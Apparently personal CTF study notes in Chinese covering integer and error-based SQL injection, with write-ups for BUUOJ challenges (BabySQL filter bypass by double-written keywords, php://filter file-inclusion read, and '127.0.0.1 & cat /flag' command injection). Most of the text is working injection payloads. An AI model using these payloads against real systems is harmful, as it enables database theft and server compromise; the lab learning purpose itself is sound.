# 整数型注入

group_concat () 括号与 concat 紧凑

步骤

  1. 确定是否存在数字型注入 1 1 and 1=2；

  2. 确定列数

  3. 确定 SQL 注入位置

  4. 获取所有数据库名

    1. 确定当前数据库名称 1 and 1=2 union select 1,databse();
    2. 获取所有数据库名 union select 1,group_concat(schema_name)from information_schema.schemata

  5. 获取表名

    union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'

  6. 获取字段名名及列数

    union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'

  7. 获取数据

    union select 1,group_concat(flag) from sqli.flag

经验：若要访问另外一张表，那么依次要找到数据库名，表名，列名，并结果一行输出

可使用以下语句

  • 数据库名 select group_concat(schema_name) from information_schema.schemata;
  • 表名 select group_concat(table_name) from information_schema.tables where table_schema='某一数据库名';
  • 列名 select group_concat(column_name) from information_schema.columns where table_schema='某一数据库名' and table_name='某一表名';
  • 获取数据 select group_concat(列名) from 数据库名.表名；

# 报错型注入

  • 1 Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;

    1 Union select count(*),concat((select flag from flag limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x

  • 1 union select extractvalue(' ',concat('~', database()));

第二种情况做到最后返回值较小只有 32 位，flag 不全，用第一种较为合适

# [极客大挑战 2019] BabySQL

本题最重要的是要找到注入点和其过滤的方法

进入后发现很多都被过滤了 union 、 select

这里需要知道一种过滤方法是 replace() , 找到某个词即转换为空，这样的话可以用双写

?username=1&password=dwa %27 ununionion seselectlect 1 %23

返回

![](/ 素材 / 图片 /[极客大挑战 2019] BabySQL_1.png)

说明字段数不同，尝试后，发现为 3 个，那么类似于上面的一种做法，但在写语句过程中

发现同样对 or ， from , where 进行了过滤，但针对库 geek ，始终过不去

查找其他的数据库

?username=1&password=6 %27 ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata %23

![](/ 素材 / 图片 /[极客大挑战 2019] BabySQL_2.png)

于是猜想 flag 在 ctf 库中，接下来都是类似于前面的语句

?username=1&password=6 %27 ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf' %23

得到 Flag 表

?username=1&password=6 %27 ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema='ctf' aandnd table_name='Flag' %23

发现对 and 过滤，双写

?username=1&password=6 %27 ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema='ctf' aandnd table_name='Flag' %23

得到 flag 列

最后

?username=1&password=6 %27 ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag %23

得到 flag

![](/ 素材 / 图片 /[极客大挑战 2019] BabySQL_3.png)

flag{ec94662d-77b8-4e18-a85b-b65b493f0278}

# [极客大挑战 2019] Secret File

查看源代码，发现有个 Archive_room.php，点击进入，再点击 secret，发现进入了 end.php

回到原来页面，发现 secret 指向为 action.php, 在网址上输入查看 action.php 的源码，发现还是跳转到了 end.php

那么猜测使用 burp 抓包，抓包发现 secr3t.php 同时发现过滤 file，输入，提示 flag 在 flag.php 里，

然后再进入新的页面，提示找到了，但看不见 用 php 伪协议来读取 flag.php

http://285c8b3f-4619-4f12-8e22-962f7ee1fe8d.node4.buuoj.cn:81/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php

得到 base64 码，解密得到 flag

使用 php 伪协议去读取的原因？

返回审计 php 代码，发现文件包含，结合题目一下想到的文件隐藏，于是我们猜测 flag 在后端文件中，并需要我们去读取他，传入的 file 经过了过滤，但是没有过滤 filter

# [ACTF2020 新生赛] Exec

先 ping 本地地址得到返回值（linux 命令执行）

127.0.0.1 & cat /flag

涉及到相关管道符知识

| (按位或) 执行后面一条语句

|| (逻辑或) 先执行前面一条，若成功则不执行后面，若错误则执行后面

& (按位与）两个都执行

&& 逻辑与
